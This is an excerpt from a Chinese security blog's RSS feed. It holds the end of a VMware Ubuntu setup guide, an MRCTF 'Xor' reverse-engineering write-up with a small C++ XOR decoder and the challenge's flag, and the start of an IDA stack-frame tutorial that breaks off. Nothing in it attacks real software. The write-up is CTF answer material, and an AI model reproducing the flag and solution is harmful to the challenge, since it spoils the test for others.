&lt;p&gt;浙江大学：[http://mirrors.zju.edu.cn/ubuntu-releases/16.04/]&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;新建虚拟机：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/linux%E5%92%8Cvmware/1858293-20201004151719901-867035121.png&#34;
	width=&#34;522&#34;
	height=&#34;427&#34;
	srcset=&#34;https://dorinxl.github.io/p/linux%E5%92%8Cvmware/1858293-20201004151719901-867035121_hu15803105023330869281.png 480w, https://dorinxl.github.io/p/linux%E5%92%8Cvmware/1858293-20201004151719901-867035121_hu7478920790023119632.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20201004144609243&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;122&#34;
		data-flex-basis=&#34;293px&#34;
	
&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;如果想要自己完整的安装ubuntu系统则需要选择&amp;quot;自定义&amp;quot;, 想懒省事话选择&amp;quot;典型&amp;quot;。（建议手动一步一步安装）&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/linux%E5%92%8Cvmware/513.png&#34;
	width=&#34;513&#34;
	height=&#34;440&#34;
	srcset=&#34;https://dorinxl.github.io/p/linux%E5%92%8Cvmware/513_hu7835210443167899966.png 480w, https://dorinxl.github.io/p/linux%E5%92%8Cvmware/513_hu8319459680486046543.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;img&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;116&#34;
		data-flex-basis=&#34;279px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/linux%E5%92%8Cvmware/513.png&#34;
	width=&#34;513&#34;
	height=&#34;440&#34;
	srcset=&#34;https://dorinxl.github.io/p/linux%E5%92%8Cvmware/513_hu7835210443167899966.png 480w, https://dorinxl.github.io/p/linux%E5%92%8Cvmware/513_hu8319459680486046543.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;img&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;116&#34;
		data-flex-basis=&#34;279px&#34;
	
&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;选择稍后安装操作系统，然后点击下一步&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/linux%E5%92%8Cvmware/1858293-20201004151720404-1939530801.png&#34;
	width=&#34;522&#34;
	height=&#34;455&#34;
	srcset=&#34;https://dorinxl.github.io/p/linux%E5%92%8Cvmware/1858293-20201004151720404-1939530801_hu2895437082715972582.png 480w, https://dorinxl.github.io/p/linux%E5%92%8Cvmware/1858293-20201004151720404-1939530801_hu7517684347298170043.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20201004144833767&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;114&#34;
		data-flex-basis=&#34;275px&#34;
	
&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;客户机操作系统 选择 Linux，版本 Ubuntu 64位(因为下载的是64位的系统，如果是 32位的，选择 Ubuntu)&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/linux%E5%92%8Cvmware/1858293-20201004151720710-1191715662.png&#34;
	width=&#34;527&#34;
	height=&#34;448&#34;
	srcset=&#34;https://dorinxl.github.io/p/linux%E5%92%8Cvmware/1858293-20201004151720710-1191715662_hu9655132110721748091.png 480w, https://dorinxl.github.io/p/linux%E5%92%8Cvmware/1858293-20201004151720710-1191715662_hu6366240901011552029.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20201004144851728&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;117&#34;
		data-flex-basis=&#34;282px&#34;
	
&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;输入 虚拟机名称 和 安装位置，然后点击下一步（前面提到的磁盘空间分类很重要）&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/linux%E5%92%8Cvmware/1858293-20201004151721775-2113272437.png&#34;
	width=&#34;512&#34;
	height=&#34;416&#34;
	srcset=&#34;https://dorinxl.github.io/p/linux%E5%92%8Cvmware/1858293-20201004151721775-2113272437_hu278615718277402868.png 480w, https://dorinxl.github.io/p/linux%E5%92%8Cvmware/1858293-20201004151721775-2113272437_hu4830617312627436230.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20201004144924599&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;123&#34;
		data-flex-basis=&#34;295px&#34;
	
&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;配置处理器，我的CPU是i5-9300H, 4核8线程, 我就按照一半来设置了&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/linux%E5%92%8Cvmware/1858293-20201004151722099-1213372090.png&#34;
	width=&#34;526&#34;
	height=&#34;525&#34;
	srcset=&#34;https://dorinxl.github.io/p/linux%E5%92%8Cvmware/1858293-20201004151722099-1213372090_hu3876520954527254445.png 480w, https://dorinxl.github.io/p/linux%E5%92%8Cvmware/1858293-20201004151722099-1213372090_hu1485330811808358714.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20201004145153944&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;100&#34;
		data-flex-basis=&#34;240px&#34;
	
&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;为虚拟机分配内存，由于我电脑配置原因我选择分配给虚拟机 4GB内存，这个按照个人电脑配置选择就行&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/linux%E5%92%8Cvmware/1858293-20201004151723203-1348181047.png&#34;
	width=&#34;501&#34;
	height=&#34;429&#34;
	srcset=&#34;https://dorinxl.github.io/p/linux%E5%92%8Cvmware/1858293-20201004151723203-1348181047_hu13895488526648159700.png 480w, https://dorinxl.github.io/p/linux%E5%92%8Cvmware/1858293-20201004151723203-1348181047_hu10238084744352126832.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20201004145313575&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;116&#34;
		data-flex-basis=&#34;280px&#34;
	
&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;网络连接方式使用默认的即可, 后期有需要可在&amp;quot;虚拟机&amp;quot;-&amp;gt;&amp;ldquo;设置&amp;quot;中更改,这里不多作解释.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/linux%E5%92%8Cvmware/1858293-20201004151723637-118984475.png&#34;
	width=&#34;488&#34;
	height=&#34;405&#34;
	srcset=&#34;https://dorinxl.github.io/p/linux%E5%92%8Cvmware/1858293-20201004151723637-118984475_hu5366819438319494054.png 480w, https://dorinxl.github.io/p/linux%E5%92%8Cvmware/1858293-20201004151723637-118984475_hu1810781338966675880.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20201004145416017&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;120&#34;
		data-flex-basis=&#34;289px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/linux%E5%92%8Cvmware/1858293-20201004151723948-701187193.png&#34;
	width=&#34;502&#34;
	height=&#34;485&#34;
	srcset=&#34;https://dorinxl.github.io/p/linux%E5%92%8Cvmware/1858293-20201004151723948-701187193_hu17471685494377448441.png 480w, https://dorinxl.github.io/p/linux%E5%92%8Cvmware/1858293-20201004151723948-701187193_hu8531410688355205491.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20201004145457716&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;103&#34;
		data-flex-basis=&#34;248px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/linux%E5%92%8Cvmware/1858293-20201004151724616-1368952546.png&#34;
	width=&#34;495&#34;
	height=&#34;417&#34;
	srcset=&#34;https://dorinxl.github.io/p/linux%E5%92%8Cvmware/1858293-20201004151724616-1368952546_hu16826692039363859828.png 480w, https://dorinxl.github.io/p/linux%E5%92%8Cvmware/1858293-20201004151724616-1368952546_hu8135880671704159914.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20201004145506371&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;118&#34;
		data-flex-basis=&#34;284px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/linux%E5%92%8Cvmware/1858293-20201004151725108-1201463891.png&#34;
	width=&#34;586&#34;
	height=&#34;488&#34;
	srcset=&#34;https://dorinxl.github.io/p/linux%E5%92%8Cvmware/1858293-20201004151725108-1201463891_hu8052986184403957811.png 480w, https://dorinxl.github.io/p/linux%E5%92%8Cvmware/1858293-20201004151725108-1201463891_hu6346912542783040369.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20201004145521458&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;120&#34;
		data-flex-basis=&#34;288px&#34;
	
&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;为虚拟机分配磁盘大小，按照个人电脑配置选择，不知道分配多少可以在自动推荐的大小上加10G。（是不是在考虑加个盘了？）&lt;/p&gt;
&lt;p&gt;勾选&amp;quot;立即分配所有磁盘空间&amp;quot;会导致在在设置完成后花费较长时间分配完整空间, 如果没有特殊需求, 不推荐。&lt;/p&gt;
&lt;p&gt;单/多个文件可根据自己选择,但总的来说,默认就好。&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/linux%E5%92%8Cvmware/1858293-20201004151726757-1430380554.png&#34;
	width=&#34;603&#34;
	height=&#34;504&#34;
	srcset=&#34;https://dorinxl.github.io/p/linux%E5%92%8Cvmware/1858293-20201004151726757-1430380554_hu14205369585853873466.png 480w, https://dorinxl.github.io/p/linux%E5%92%8Cvmware/1858293-20201004151726757-1430380554_hu15771475793573743516.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20201004145657437&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;119&#34;
		data-flex-basis=&#34;287px&#34;
	
&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/linux%E5%92%8Cvmware/1858293-20201004151727104-31899892.png&#34;
	width=&#34;599&#34;
	height=&#34;250&#34;
	srcset=&#34;https://dorinxl.github.io/p/linux%E5%92%8Cvmware/1858293-20201004151727104-31899892_hu7290845526750321588.png 480w, https://dorinxl.github.io/p/linux%E5%92%8Cvmware/1858293-20201004151727104-31899892_hu5828699807625231026.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20201004145801951&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;239&#34;
		data-flex-basis=&#34;575px&#34;
	
&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;这里点击 自定义硬件 按钮，因为在步骤5选择安装来源的时候，我们选择了稍后安装操作系统，所以在这里我们会选择系统镜像的路径。&lt;/p&gt;
&lt;p&gt;这里配置系统镜像路径，也可以在配置完虚拟机后再编辑，也就是在一开始的界面上面的菜单栏里点击 编辑此虚拟机 ，一样可以进入到下一步的配置界面：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/linux%E5%92%8Cvmware/1858293-20201004151728621-90949487.png&#34;
	width=&#34;472&#34;
	height=&#34;110&#34;
	srcset=&#34;https://dorinxl.github.io/p/linux%E5%92%8Cvmware/1858293-20201004151728621-90949487_hu12819227269476876609.png 480w, https://dorinxl.github.io/p/linux%E5%92%8Cvmware/1858293-20201004151728621-90949487_hu6421190508087154332.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20201004145947233&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;429&#34;
		data-flex-basis=&#34;1029px&#34;
	
&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;点击 新CD/DVD，在右边的连接部分选择 使用 ISO 映像文件，点击 浏览 按钮，选择安装的操作系统，然后点击 关闭 退出配置界面：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/linux%E5%92%8Cvmware/1858293-20201004151729002-674107110.png&#34;
	width=&#34;868&#34;
	height=&#34;291&#34;
	srcset=&#34;https://dorinxl.github.io/p/linux%E5%92%8Cvmware/1858293-20201004151729002-674107110_hu7385808164697554464.png 480w, https://dorinxl.github.io/p/linux%E5%92%8Cvmware/1858293-20201004151729002-674107110_hu2152256779670111368.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20201004150026804&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;298&#34;
		data-flex-basis=&#34;715px&#34;
	
&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;点击 完成：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/linux%E5%92%8Cvmware/1858293-20201004151729306-1450588591.png&#34;
	width=&#34;440&#34;
	height=&#34;186&#34;
	srcset=&#34;https://dorinxl.github.io/p/linux%E5%92%8Cvmware/1858293-20201004151729306-1450588591_hu3882113563615092237.png 480w, https://dorinxl.github.io/p/linux%E5%92%8Cvmware/1858293-20201004151729306-1450588591_hu18348780406182229361.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20201004150045090&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;236&#34;
		data-flex-basis=&#34;567px&#34;
	
&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;开启虚拟机进行初始化：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/linux%E5%92%8Cvmware/1858293-20201004151729523-493690726.png&#34;
	width=&#34;265&#34;
	height=&#34;114&#34;
	srcset=&#34;https://dorinxl.github.io/p/linux%E5%92%8Cvmware/1858293-20201004151729523-493690726_hu9811199794736484313.png 480w, https://dorinxl.github.io/p/linux%E5%92%8Cvmware/1858293-20201004151729523-493690726_hu10681585148297259080.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20201004150059610&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;232&#34;
		data-flex-basis=&#34;557px&#34;
	
&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;之后便是安装ubuntu的过程。&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;    到此为止已经成功了一大半了，剩下的便请你们自行摸索，好好利用各种搜索引擎寻找资料。&lt;/p&gt;
&lt;p&gt;    注意在第一次成功进入之后可以拍摄快照保留环境，以防之后在进行骚操作的时候把系统玩崩没办法还原。&lt;/p&gt;
&lt;p&gt;    关于快照：大可理解为存档，拍摄了快照就是保存了存档，如果后面出现了不可挽救的错误便可以恢复存到到灾难还没发生之前。&lt;/p&gt;
&lt;br/&gt;
&lt;h1 id=&#34;结语&#34;&gt;结语
&lt;/h1&gt;&lt;hr&gt;
&lt;br/&gt;
&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;Linux对于小白来说可能是一片新世界，对一年前的我而言就是如此。不过，在不断学习的道路中我们终究会认识他，了解他。安全的门槛说高不高说低不低，只要坚持不懈，用心钻研，小白也会成长为很厉害的大佬。 ~~(被千人捧，被万人膜)~~
&lt;p&gt;       整篇文章说白了就是引导信息搜集。网上有很多资料可供学习，我在这里仅仅是将他们整理了一下放了出来。学习安全的道路也是不断折腾的道路，我们会遇到很多很多奇形怪状不可名的问题，这个时候应该养成良好的解决问题的思路，遇到问题先做什么在做什么。不仅是学习安全，有了自己的一套解决问题的方法，在日常生活中也会起很大帮助。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>【MRCTF】Xor</title>
        <link>https://dorinxl.github.io/p/mrctfxor/</link>
        <pubDate>Sun, 13 Sep 2020 11:07:00 +0000</pubDate>
        
        <guid>https://dorinxl.github.io/p/mrctfxor/</guid>
        <description>&lt;h3 id=&#34;f5的时候遇到以下问题&#34;&gt;F5的时候遇到以下问题
&lt;/h3&gt;&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/mrctfxor/1858293-20200913190543182-1470295316.png&#34;
	width=&#34;477&#34;
	height=&#34;196&#34;
	srcset=&#34;https://dorinxl.github.io/p/mrctfxor/1858293-20200913190543182-1470295316_hu3579345569571246980.png 480w, https://dorinxl.github.io/p/mrctfxor/1858293-20200913190543182-1470295316_hu4634878792292157395.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20200913190019364&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;243&#34;
		data-flex-basis=&#34;584px&#34;
	
&gt;&lt;/p&gt;
&lt;h1 id=&#34;1-按空格找到出错地址&#34;&gt;1. 按空格，找到出错地址
&lt;/h1&gt;&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/mrctfxor/1858293-20200913190543594-264907755.png&#34;
	width=&#34;593&#34;
	height=&#34;86&#34;
	srcset=&#34;https://dorinxl.github.io/p/mrctfxor/1858293-20200913190543594-264907755_hu9865830171390584689.png 480w, https://dorinxl.github.io/p/mrctfxor/1858293-20200913190543594-264907755_hu10840740142028233381.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20200913190058061&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;689&#34;
		data-flex-basis=&#34;1654px&#34;
	
&gt;
 &lt;/p&gt;
&lt;h1 id=&#34;2-双击进入函数然后退出再f5恢复正常&#34;&gt;2. 双击进入函数，然后退出再F5，恢复正常
&lt;/h1&gt;&lt;h3 id=&#34;原因是因为ida不能正确识别这个call的参数或者是参数出错&#34;&gt;原因是因为IDA不能正确识别这个call的参数，或者是参数出错。
&lt;/h3&gt;&lt;p&gt; &lt;/p&gt;
&lt;h1 id=&#34;3-f5之后解题&#34;&gt;3. F5之后解题
&lt;/h1&gt;&lt;h3 id=&#34;简单的xor加密一下从0到len-1对每一位进行运算逆着推一边就出flag&#34;&gt;简单的XOR加密一下，从0到len-1对每一位进行运算，逆着推一边就出flag。
&lt;/h3&gt;&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/mrctfxor/1858293-20200913190543932-1692492868.png&#34;
	width=&#34;799&#34;
	height=&#34;556&#34;
	srcset=&#34;https://dorinxl.github.io/p/mrctfxor/1858293-20200913190543932-1692492868_hu10832593542287981806.png 480w, https://dorinxl.github.io/p/mrctfxor/1858293-20200913190543932-1692492868_hu14408524855915568413.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20200913185937457&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;143&#34;
		data-flex-basis=&#34;344px&#34;
	
&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;9
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-c++&#34; data-lang=&#34;c++&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;#include&amp;lt;iostream&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;#include&amp;lt;cstring&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;using&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;namespace&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;std&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(){&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s&#34;&gt;&amp;#34;MSAWB~FXZ:J:`tQJ&lt;/span&gt;&lt;span class=&#34;se&#34;&gt;\&amp;#34;&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;N@ bpdd}8g&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;k&#34;&gt;for&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;i&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;strlen&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;++&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;){&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;		&lt;span class=&#34;n&#34;&gt;cout&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;kt&#34;&gt;char&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;^&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h6 id=&#34;flagmrctf_r31ly_e2_r3verse&#34;&gt;flag:MRCTF{@_R3@1ly_E2_R3verse!}
&lt;/h6&gt;</description>
        </item>
        <item>
        <title>IDA 调整栈帧 (411A04:positive sp value has been found)</title>
        <link>https://dorinxl.github.io/p/ida-%E8%B0%83%E6%95%B4%E6%A0%88%E5%B8%A7-411a04positive-sp-value-has-been-found/</link>
        <pubDate>Sat, 12 Sep 2020 10:37:00 +0000</pubDate>
        
        <guid>https://dorinxl.github.io/p/ida-%E8%B0%83%E6%95%B4%E6%A0%88%E5%B8%A7-411a04positive-sp-value-has-been-found/</guid>
        <description>&lt;p&gt;有时候，或者说经常，我们会在F5的时候遇到栈帧不平衡的问题。每每这种时候就需要我们手动alt+k调整栈帧。
 
我曾经非常苦恼，这是个什么玩意，我到底该怎么调整栈帧。网上查了很多资料很多博客，但我都觉得难以理解，而且难以操作。
 
后来我无意间看到一篇博客，说只要用他的方法，调整栈帧是很容易的一件事，我尝试了，确实如此。但是我忘了这篇博客是哪位师傅写的，也找不到了。于是我决定记录一下，留给像我这样的小白看。
 
调整栈帧遇到的必然是这样一张图：&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/ida-%E8%B0%83%E6%95%B4%E6%A0%88%E5%B8%A7-411a04positive-sp-value-has-been-found/1858293-20200912183237850-1976271514.png&#34;
	width=&#34;564&#34;
	height=&#34;222&#34;
	srcset=&#34;https://dorinxl.github.io/p/ida-%E8%B0%83%E6%95%B4%E6%A0%88%E5%B8%A7-411a04positive-sp-value-has-been-found/1858293-20200912183237850-1976271514_hu8760989378959027445.png 480w, https://dorinxl.github.io/p/ida-%E8%B0%83%E6%95%B4%E6%A0%88%E5%B8%A7-411a04positive-sp-value-has-been-found/1858293-20200912183237850-1976271514_hu2893487757768474275.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20200912182406526&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;254&#34;
		data-flex-basis=&#34;609px&#34;
	
&gt;
 &lt;/p&gt;
&lt;h1 id=&#34;第一步-打开options-general-stack-pointer&#34;&gt;第一步 打开Options-&amp;gt;General-&amp;gt;Stack pointer
&lt;/h1&gt;&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/ida-%E8%B0%83%E6%95%B4%E6%A0%88%E5%B8%A7-411a04positive-sp-value-has-been-found/1858293-20200912183238181-117707568.png&#34;
	width=&#34;358&#34;
	height=&#34;190&#34;
	srcset=&#34;https://dorinxl.github.io/p/ida-%E8%B0%83%E6%95%B4%E6%A0%88%E5%B8%A7-411a04positive-sp-value-has-been-found/1858293-20200912183238181-117707568_hu2348472384663214341.png 480w, https://dorinxl.github.io/p/ida-%E8%B0%83%E6%95%B4%E6%A0%88%E5%B8%A7-411a04positive-sp-value-has-been-found/1858293-20200912183238181-117707568_hu10143319702813184454.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20200912182601339&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;188&#34;
		data-flex-basis=&#34;452px&#34;
	
&gt;
 &lt;/p&gt;
&lt;h1 id=&#34;第二步-找红色的区域&#34;&gt;第二步 找红色的区域
&lt;/h1&gt;&lt;h3 id=&#34;如果遇到栈帧不平衡而f5不能的情况我们需要在图形视图找到这样一处或几处红色的区域&#34;&gt;如果遇到栈帧不平衡而F5不能的情况，我们需要在图形视图找到这样一处(或几处)红色的区域：
&lt;/h3&gt;&lt;p&gt;&lt;img src=&#34;https://dorinxl.github.io/p/ida-%E8%B0%83%E6%95%B4%E6%A0%88%E5%B8%A7-411a04positive-sp-value-has-been-found/1858293-20200912183238544-1591647099.png&#34;
	width=&#34;416&#34;
	height=&#34;154&#34;
	srcset=&#34;https://dorinxl.github.io/p/ida-%E8%B0%83%E6%95%B4%E6%A0%88%E5%B8%A7-411a04positive-sp-value-has-been-found/1858293-20200912183238544-1591647099_hu14729456333038582305.png 480w, https://dorinxl.github.io/p/ida-%E8%B0%83%E6%95%B4%E6%A0%88%E5%B8%A7-411a04positive-sp-value-has-been-found/1858293-20200912183238544-1591647099_hu13643896785422700058.png 1024w&#34;
	loading=&#34;lazy&#34;
	
		alt=&#34;image-20200912182820710&#34;
	
	
		class=&#34;gallery-image&#34; 
		data-flex-grow=&#34;270&#34;
		data-flex-basis=&#34;648px&#34;
	
&gt;
 &lt;/p&gt;
&lt;h1 id=&#34;第三步-按空格识别代码块&#34;&gt;第三步 按空格识别代码块
